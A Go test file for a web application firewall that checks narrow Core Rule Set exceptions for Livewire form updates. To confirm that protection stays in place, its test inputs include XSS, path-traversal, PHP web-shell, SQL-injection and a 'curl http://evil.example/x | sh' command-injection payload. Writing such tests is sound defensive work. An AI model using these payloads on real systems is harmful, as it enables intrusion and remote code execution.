package waf

import (
	"encoding/json"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"
)

// livewireBody builds a request as Livewire sends it. text goes into the
// snapshot state, update into the updates of the component.
func livewireBody(t *testing.T, text, update string) string {
	t.Helper()
	snap, err := json.Marshal(map[string]any{"data": map[string]any{"text": text}, "memo": map[string]any{"name": "tools.converter"}, "checksum": "abc123"})
	if err != nil {
		t.Fatal(err)
	}
	body, err := json.Marshal(map[string]any{"_token": "tok", "components": []any{
		map[string]any{"snapshot": string(snap), "updates": map[string]any{"text": update}, "calls": []any{}},
		map[string]any{"snapshot": string(snap), "updates": map[string]any{"text": update}, "calls": []any{}},
	}})
	if err != nil {
		t.Fatal(err)
	}
	return string(body)
}

// mixedCaseField has text in the update bodyText. Field names of Livewire are
// camelCase, and a regular expression in ctl only matches them with (?i).
func mixedCaseField(t *testing.T, text string) string {
	t.Helper()
	return strings.ReplaceAll(livewireBody(t, "", text), `"text":`, `"bodyText":`)
}

func anomaly(t *testing.T, inst *Instance, target, ctype, body string) *Analysis {
	t.Helper()
	return anomalyOn(t, inst, "app.example", target, ctype, body)
}

func anomalyOn(t *testing.T, inst *Instance, host, target, ctype, body string) *Analysis {
	t.Helper()
	r := httptest.NewRequest("POST", target, strings.NewReader(body))
	r.Host = host
	r.Header.Set("Content-Type", ctype)
	r.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0")
	r.Header.Set("Accept", "text/html")
	tx, c := inst.NewTransaction()
	defer func() { c.Finish(); _ = tx.Close() }()
	ProcessHeaders(tx, r, "198.51.100.77", 40000)
	if _, _, err := ReadBody(tx, r, DefaultLimits); err != nil {
		t.Fatal(err)
	}
	_, _ = tx.ProcessRequestBody()
	return inst.Analyze(tx.MatchedRules())
}

func livewireWAF(t *testing.T, on bool) *Instance {
	t.Helper()
	inst, err := Build(Config{CRS: true, ParanoiaLevel: 1, AnomalyThreshold: 5, Livewire: on})
	if err != nil {
		t.Fatal(err)
	}
	return inst
}

// Everyday text that CRS blocks in any field. The test fails when a CRS update
// stops matching one of them.
var livewireMath = []string{
	`Sei $f(x)$ gegeben.`,                  // 933180
	`Die Lösungen sind $x_{1,2}$.`,         // 932280
	`Kosten: 5$ (netto), 7$ (brutto)`,      // 932130
	`Es gilt $\sin(x)$ und $\cos(x)$.`,     // 942151
	`\log_{2}(8) = 3, \ln(e) = 1, \exp(x)`, // 933160, 942151
	`sin(x) = 0`,                           // 942100
}

const livewireJSON = "application/json"

// The example of the runbook: one field on one domain.
const textFieldException = `SecRule REQUEST_HEADERS:Host "@streq app.example" "id:1000301,phase:1,pass,nolog,t:lowercase,chain"
  SecRule REQUEST_FILENAME "@streq /livewire/update" "t:none,ctl:ruleRemoveTargetById=932130;ARGS:/(?i)^json\.components\.\d+\.updates\.bodyText$/,ctl:ruleRemoveTargetById=932280;ARGS:/(?i)^json\.components\.\d+\.updates\.bodyText$/,ctl:ruleRemoveTargetById=933160;ARGS:/(?i)^json\.components\.\d+\.updates\.bodyText$/,ctl:ruleRemoveTargetById=933180;ARGS:/(?i)^json\.components\.\d+\.updates\.bodyText$/,ctl:ruleRemoveTargetById=942100;ARGS:/(?i)^json\.components\.\d+\.updates\.bodyText$/,ctl:ruleRemoveTargetById=942151;ARGS:/(?i)^json\.components\.\d+\.updates\.bodyText$/"
`

// Only the snapshot leaves CRS, and only with the switch on.
func TestLivewireSnapshotOnly(t *testing.T) {
	off, on := livewireWAF(t, false), livewireWAF(t, true)
	for _, text := range livewireMath {
		snapshot := livewireBody(t, text, "")
		if a := anomaly(t, off, "/livewire/update", livewireJSON, snapshot); !a.CRSBlock {
			t.Errorf("%q passes without the exception, the sample is stale", text)
		}
		a := anomaly(t, on, "/livewire/update", livewireJSON, snapshot)
		if a.CRSBlock || len(a.Matches) != 0 {
			t.Errorf("snapshot %q: must pass without a finding: %+v", text, a.Matches)
		}
		if a := anomaly(t, on, "/livewire/update", livewireJSON, livewireBody(t, "", text)); !a.CRSBlock {
			t.Errorf("update %q passed by default", text)
		}
	}
}

// A snapshot only leaves CRS on the Livewire path and as a body argument.
func TestLivewireExceptionStaysOnItsPath(t *testing.T) {
	inst := livewireWAF(t, true)
	text := livewireMath[0]
	if a := anomaly(t, inst, "/livewire/other", livewireJSON, livewireBody(t, text, "")); !a.CRSBlock {
		t.Error("other path passed")
	}
	if a := anomaly(t, inst, "/livewire/update?snapshot="+url.QueryEscape(`' OR 1=1--`), livewireJSON, "{}"); !a.CRSBlock {
		t.Error("attack in the query passed")
	}
}

func TestTextFieldExceptionOnOneDomain(t *testing.T) {
	inst, err := Build(Config{CRS: true, ParanoiaLevel: 1, AnomalyThreshold: 5, Livewire: true, LocalRules: textFieldException})
	if err != nil {
		t.Fatal(err)
	}
	for _, text := range livewireMath {
		body := mixedCaseField(t, text)
		a := anomaly(t, inst, "/livewire/update", livewireJSON, body)
		if a.CRSBlock {
			t.Errorf("%q blocked in the excepted field: %v", text, a.MatchedIDs)
		}
		if got := anomalyOn(t, inst, "other.example", "/livewire/update", livewireJSON, body); !got.CRSBlock {
			t.Errorf("%q passed on another domain", text)
		}
		if got := anomaly(t, inst, "/livewire/update", livewireJSON, livewireBody(t, "", text)); !got.CRSBlock {
			t.Errorf("%q passed in another field", text)
		}
	}
	// The field keeps the other rules.
	for _, attack := range []string{`<script>alert(1)</script>`, `../../../../etc/passwd`, `<?php system($_GET['c']); ?>`, `; curl http://evil.example/x | sh`} {
		if a := anomaly(t, inst, "/livewire/update", livewireJSON, mixedCaseField(t, attack)); !a.CRSBlock {
			t.Errorf("%q passed in the excepted field", attack)
		}
	}
}
